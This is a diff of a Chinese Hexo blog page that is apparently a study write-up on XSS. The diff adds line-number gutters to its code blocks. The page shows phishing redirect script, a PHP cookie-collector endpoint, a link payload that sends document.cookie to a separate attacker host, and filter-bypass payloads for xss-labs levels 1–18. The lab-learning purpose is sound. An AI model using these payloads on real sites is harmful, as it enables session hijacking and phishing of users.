@@ -43,7 +43,7 @@
     <script src="/libs/jquery/jquery.min.js"></script>
 
 <meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Jf71o0x1o1l" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
     
@@ -519,7 +519,7 @@
 <li><p>注入类</p></li>
 <li><p>代码</p></li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content=&lt;button&gt;快来点我&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=&lt;button&gt;快来点我&lt;/button&gt;</span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/5had0wKv/pictureBed/img/202208242128200.png"
@@ -535,13 +535,13 @@ alt="image-20220824212859062" />
 <li>在超链接中</li>
 </ul></li>
 </ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> &gt;</span>点击有惊喜<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> &gt;</span>点击有惊喜<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>iframe 框架</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://www.taobao.com&quot;/&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://www.taobao.com&quot;/&gt;</span><br></pre></td></tr></table></figure>
 <p>钓鱼网站、</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;script&gt;document.write(&#x27;你的用户名不正确，请重新登录&#x27;);setTimeout(function()&#123;</span><br><span class="line">    location.href= &#x27;https://www.taobao.com&#x27;;</span><br><span class="line">&#125;,3000);</span><br><span class="line">&lt;/script&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;script&gt;document.write(&#x27;你的用户名不正确，请重新登录&#x27;);setTimeout(function()&#123;</span><br><span class="line">    location.href= &#x27;https://www.taobao.com&#x27;;</span><br><span class="line">&#125;,3000);</span><br><span class="line">&lt;/script&gt;&quot;;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>渗透步骤
 <ul>
@@ -564,7 +564,7 @@ alt="image-20220825170727204" />
 <ul>
 <li>132 获取130机器cookie</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$author</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];    <span class="comment">// 用成了post</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$author</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];    <span class="comment">// 用成了post</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>文章中插入js代码</li>
 </ul>
@@ -589,7 +589,7 @@ alt="获取cookie" />
 <ul>
 <li>发帖功能存在XSS漏洞</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;BUtton onclick = &quot;alert(documnet.cookie)&quot;&gt;点我有惊喜&lt;/BUtton&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BUtton onclick = &quot;alert(documnet.cookie)&quot;&gt;点我有惊喜&lt;/BUtton&gt;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>blue-lotus 安装: <a
 target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41683305/article/details/114282690">参考</a>
@@ -613,7 +613,7 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209102325463.png"
 alt="image-20220910232531377" />
 <figcaption aria-hidden="true">image-20220910232531377</figcaption>
 </figure>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#在xampp中的bin 文件夹启动mysql</span><br><span class="line">use mysql;</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> password<span class="operator">=</span>password(<span class="string">&#x27;123&#x27;</span>) <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> host<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#在xampp中的bin 文件夹启动mysql</span><br><span class="line">use mysql;</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> password<span class="operator">=</span>password(<span class="string">&#x27;123&#x27;</span>) <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> host<span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>回调的代码出错：</li>
 </ul>
@@ -626,8 +626,8 @@ alt="image-20220911152122560" />
 <ul>
 <li>构建xss</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#132 xssReceive.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ipaddr</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$_COOKIE</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;数据库连接不成功.&#x27;</span>);</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into xssdata(ipaddr,url,cookie,createtime) value(&#x27;<span class="subst">$ipaddr</span>&#x27;, &#x27;<span class="subst">$url</span>&#x27;, &#x27;<span class="subst">$cookie</span>&#x27;, now())&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo &quot;&lt;script&gt;history.back();&lt;/script&gt;&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;loaction.href=&#x27;http://www.woniunote.com/&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"><span class="comment">// http://192.168.104.132/xss/xssReceive.php?url=</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;javascript:loacation.href=&quot;http://192.168.104.132/xss/xssReceive.php?url=“+location.href+”&amp;cookie=&quot;+document.cookie&#x27;</span>&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.104.132/xss/01.png&quot;</span>/&gt;</span></span></span><br><span class="line">&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">\</span>&#x27; <span class="attr">javascript:loacation.href</span>=<span class="string">&quot;http://192.168.104.132/xss/xssReceive.php?url=&quot;</span>%<span class="attr">2Blocation.href</span>%<span class="attr">2B</span>&quot;%<span class="attr">26cookie</span>=<span class="string">&quot; %2Bdocument.cookie \&#x27;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">    &lt;img src=&quot;</span><span class="attr">http:</span>//<span class="attr">192.168.104.132</span>/<span class="attr">xss</span>/<span class="attr">01.png</span>&quot;/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#132 xssReceive.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ipaddr</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$_COOKIE</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;learn&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;数据库连接不成功.&#x27;</span>);</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">set_charset</span>(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into xssdata(ipaddr,url,cookie,createtime) value(&#x27;<span class="subst">$ipaddr</span>&#x27;, &#x27;<span class="subst">$url</span>&#x27;, &#x27;<span class="subst">$cookie</span>&#x27;, now())&quot;</span>;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo &quot;&lt;script&gt;history.back();&lt;/script&gt;&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;loaction.href=&#x27;http://www.woniunote.com/&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"><span class="comment">// http://192.168.104.132/xss/xssReceive.php?url=</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;javascript:loacation.href=&quot;http://192.168.104.132/xss/xssReceive.php?url=“+location.href+”&amp;cookie=&quot;+document.cookie&#x27;</span>&gt;</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.104.132/xss/01.png&quot;</span>/&gt;</span></span></span><br><span class="line">&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">\</span>&#x27; <span class="attr">javascript:loacation.href</span>=<span class="string">&quot;http://192.168.104.132/xss/xssReceive.php?url=&quot;</span>%<span class="attr">2Blocation.href</span>%<span class="attr">2B</span>&quot;%<span class="attr">26cookie</span>=<span class="string">&quot; %2Bdocument.cookie \&#x27;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">    &lt;img src=&quot;</span><span class="attr">http:</span>//<span class="attr">192.168.104.132</span>/<span class="attr">xss</span>/<span class="attr">01.png</span>&quot;/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209111539634.png"
@@ -713,7 +713,7 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209120004239.png"
 alt="image-20220912000415096" />
 <figcaption aria-hidden="true">image-20220912000415096</figcaption>
 </figure>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.104.130/xss-labs/level1.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.104.130/xss-labs/level1.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>level-2</li>
 </ul>
@@ -723,7 +723,7 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209120021466.png"
 alt="image-20220912002111411" />
 <figcaption aria-hidden="true">image-20220912002111411</figcaption>
 </figure>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#闭合双引号和尖括号</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert(&#x27;1&#x27;)<span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#闭合双引号和尖括号</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert(&#x27;1&#x27;)<span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>level-3</li>
 </ul>
@@ -766,7 +766,7 @@ alt="image-20220912112716944" />
 <li>屏蔽href: 大小写绕过</li>
 </ul></li>
 </ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">hRef</span> =<span class="string">javascript:alert(1)</span> /<span class="attr">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">a</span> <span class="attr">hRef</span> =<span class="string">javascript:alert(1)</span> /<span class="attr">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121136620.png"
@@ -779,7 +779,7 @@ alt="image-20220912113640527" />
 <li>只过滤一次</li>
 </ul></li>
 </ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">scRScriptIpt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScriScriptpt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">scRScriptIpt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">ScriScriptpt</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <ul>
 <li>level-8
 <ul>
@@ -798,7 +798,7 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121333191.png"
 alt="image-20220912133349148" />
 <figcaption aria-hidden="true">image-20220912133349148</figcaption>
 </figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;a hRef =javascript:alert(1) /a&gt;</span><br><span class="line">javascript:alert(1) </span><br><span class="line">html encode:</span><br><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> &lt;a hRef =javascript:alert(1) /a&gt;</span><br><span class="line">javascript:alert(1) </span><br><span class="line">html encode:</span><br><span class="line">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br></pre></td></tr></table></figure>
 <ul>
 <li>level-9
 <ul>
@@ -811,18 +811,18 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121354347.png"
 alt="image-20220912135434273" />
 <figcaption aria-hidden="true">image-20220912135434273</figcaption>
 </figure>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(1)//http://www.baidu.com</span><br><span class="line"># 保留http://，其余编码</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)//http://www.baidu.com</span><br><span class="line"># 保留http://，其余编码</span><br></pre></td></tr></table></figure>
 <ul>
 <li>level-10</li>
 </ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 测试</span><br><span class="line">&#x27;&#x27; &#x27; &gt;&lt; script onclick</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 测试</span><br><span class="line">&#x27;&#x27; &#x27; &gt;&lt; script onclick</span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121425836.png"
 alt="三个隐藏标签" />
 <figcaption aria-hidden="true">三个隐藏标签</figcaption>
 </figure>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># 检测试探隐藏<span class="selector-tag">input</span></span><br><span class="line">t_link=&quot; type=&#x27;text&#x27;&gt;//&amp;t_history=&quot; type=&#x27;text&#x27;&gt;//&amp;t_sort=&quot; type=&#x27;text&#x27;&gt;//</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 检测试探隐藏<span class="selector-tag">input</span></span><br><span class="line">t_link=&quot; type=&#x27;text&#x27;&gt;//&amp;t_history=&quot; type=&#x27;text&#x27;&gt;//&amp;t_sort=&quot; type=&#x27;text&#x27;&gt;//</span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121638743.png"
@@ -844,14 +844,14 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121656755.png"
 alt="image-20220912165658683" />
 <figcaption aria-hidden="true">image-20220912165658683</figcaption>
 </figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">t_link=&quot; type=&#x27;text&#x27;&gt;//&amp;t_history=&quot; type=&#x27;text&#x27;&gt;//&amp;t_sort=&quot; type=&#x27;text&#x27;&gt;//&amp;t_ref=&quot; type=&#x27;text&#x27;&gt;//</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_link=&quot; type=&#x27;text&#x27;&gt;//&amp;t_history=&quot; type=&#x27;text&#x27;&gt;//&amp;t_sort=&quot; type=&#x27;text&#x27;&gt;//&amp;t_ref=&quot; type=&#x27;text&#x27;&gt;//</span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121657058.png"
 alt="image-20220912165738998" />
 <figcaption aria-hidden="true">image-20220912165738998</figcaption>
 </figure>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; type=&#x27;text&#x27; onclick=&#x27;javascript:alert(1)&#x27;&gt;//</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=&#x27;text&#x27; onclick=&#x27;javascript:alert(1)&#x27;&gt;//</span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209121714232.png"
@@ -910,7 +910,7 @@ alt="img" />
 <ul>
 <li>level-15</li>
 </ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.104.130/xss-labs/level15.php?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.104.130/xss-labs/level15.php?src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span>&#x27;</span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122025344.png"
@@ -920,13 +920,13 @@ alt="image-20220912202525209" />
 <ul>
 <li>level-16</li>
 </ul>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># 试探</span><br><span class="line">“ ‘ <span class="tag">&lt;&gt;</span> script onerror  onclick</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 试探</span><br><span class="line">“ ‘ <span class="tag">&lt;&gt;</span> script onerror  onclick</span><br></pre></td></tr></table></figure>
 <blockquote>
 <ul>
 <li>空格可以使用%0a和%0d替换</li>
 </ul>
 </blockquote>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img%0asrc=1%0donerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0asrc=1%0donerror=alert(&#x27;xss&#x27;)&gt;</span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122344830.png"
@@ -942,7 +942,7 @@ src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122355653.png"
 alt="分析源码" />
 <figcaption aria-hidden="true">分析源码</figcaption>
 </figure>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.104.130/xss-labs/level18.php?arg01=a&amp;arg02=b onmouseover = alert(1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.104.130/xss-labs/level18.php?arg01=a&amp;arg02=b onmouseover = alert(1)</span><br></pre></td></tr></table></figure>
 <figure>
 <img
 src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122355954.png"
@@ -1574,7 +1574,7 @@ alt="image-20220912235558854" />
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">238.7k</span>&nbsp;字
+                class="white-color">235.6k</span>&nbsp;字
             
             
             
